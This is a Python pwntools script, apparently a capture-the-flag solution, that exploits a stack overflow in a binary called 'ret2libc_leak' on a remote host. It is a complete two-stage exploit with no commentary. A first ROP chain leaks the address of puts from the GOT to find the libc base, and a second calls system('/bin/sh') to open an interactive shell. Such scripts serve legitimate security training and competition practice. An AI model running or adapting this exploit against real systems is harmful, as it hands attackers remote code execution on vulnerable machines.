#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./ret2libc_leak', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

HOSTNAME = 'offsec.m0lecon.it'
PORT = 13520

OFFSET_TO_RIP = 72


def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)


def main():
    p = conn()

    POP_RDI = exe.sym.pop_rdi_ret
    RET = ROP(exe).find_gadget(['ret']).address
    PUTS_PLT = exe.plt['puts']
    PUTS_GOT = exe.got['puts']
    MAIN = exe.sym['main']
    BINSH = next(exe.search(b'/bin/sh\x00'))

    p.recvuntil(b'looking for?\n')
    stage1 = flat(
        b'A' * OFFSET_TO_RIP,
        p64(POP_RDI),
        p64(PUTS_GOT),
        p64(PUTS_PLT),
        p64(MAIN)
    )

    p.send(stage1)
    p.recvline()

    leaked = p.recvline().strip()
    leak_puts = u64(leaked.ljust(8, b'\x00'))
    log.info(f"puts leak = {leak_puts:#x}")

    libc.address = leak_puts - libc.symbols['puts']
    log.info(f"libc base = {libc.address:#x}")

    system_addr = libc.symbols['system']

    p.recvuntil(b'looking for?\n')
    stage2 = flat(
        b'A' * OFFSET_TO_RIP,
        p64(RET),
        p64(POP_RDI),
        p64(BINSH),
        p64(system_addr)
    )

    p.send(stage2)
    p.interactive()


if __name__ == '__main__':
    main()